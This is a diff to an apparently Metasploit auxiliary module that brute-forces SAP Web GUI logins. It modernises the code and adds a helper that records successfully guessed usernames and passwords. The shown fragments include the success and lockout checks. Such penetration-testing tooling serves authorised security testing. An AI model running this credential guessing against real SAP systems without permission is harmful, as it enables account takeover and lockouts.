@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -14,10 +14,7 @@
 # provided excellent feedback. Some people just seem to enjoy hacking SAP :)
 ##
 
-require 'msf/core'
-
-class Metasploit4 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
@@ -48,10 +45,10 @@ class Metasploit4 < Msf::Auxiliary
       [
         Opt::RPORT(8000),
         OptString.new('TARGETURI', [true, 'URI', '/']),
-        OptString.new('CLIENT', [false, 'Client can be single (066), comma seperated list (000,001,066) or range (000-999)', '000,001,066']),
+        OptString.new('CLIENT', [false, 'Client can be single (066), comma separated list (000,001,066) or range (000-999)', '000,001,066']),
         OptBool.new('DEFAULT_CRED',[false, 'Check using the default password and username',true]),
         OptString.new('USERPASS_FILE',[false, '',nil])
-      ], self.class)
+      ])
   end
 
   def run_host(ip)
@@ -107,6 +104,33 @@ class Metasploit4 < Msf::Auxiliary
 
   end
 
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: opts[:service_name],
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user],
+      private_data: opts[:password],
+      private_type: :password
+    }.merge(service_data)
+
+    login_data = {
+      last_attempted_at: Time.now,
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::SUCCESSFUL,
+      proof: opts[:proof]
+    }.merge(service_data)
+
+    create_credential_login(login_data)
+  end
+
   def bruteforce(uri,user,pass,cli)
     begin
       path = "sap/bc/gui/sap/its/webgui/"
@@ -134,30 +158,26 @@ class Metasploit4 < Msf::Auxiliary
     end
 
     if res and res.code == 302
-      report_auth_info(
-        :host => rhost,
-        :port => rport,
-        :sname => "sap_webgui",
-        :proto => "tcp",
-        :user => "#{user}",
-        :pass => "#{pass}",
-        :proof => "SAP Client: #{cli}",
-        :active => true
+      report_cred(
+        ip: rhost,
+        port: rport,
+        service_name: 'sap_webgui',
+        user: user,
+        password: pass,
+        proof: "SAP Client: #{cli}"
       )
       return true
     elsif res and res.code == 200
       if res.body =~ /log on again/
         return false
       elsif res.body =~ /<title>Change Password - SAP Web Application Server<\/title>/
-        report_auth_info(
-          :host => rhost,
-          :port => rport,
-          :sname => "sap_webgui",
-          :proto => "tcp",
-          :user => "#{user}",
-          :pass => "#{pass}",
-          :proof => "SAP Client: #{cli}",
-          :active => true
+        report_cred(
+          ip: rhost,
+          port: rport,
+          service_name: 'sap_webgui',
+          user: user,
+          password: pass,
+          proof: "SAP Client: #{cli}"
         )
         return true
       elsif res.body =~ /Password logon no longer possible - too many failed attempts/
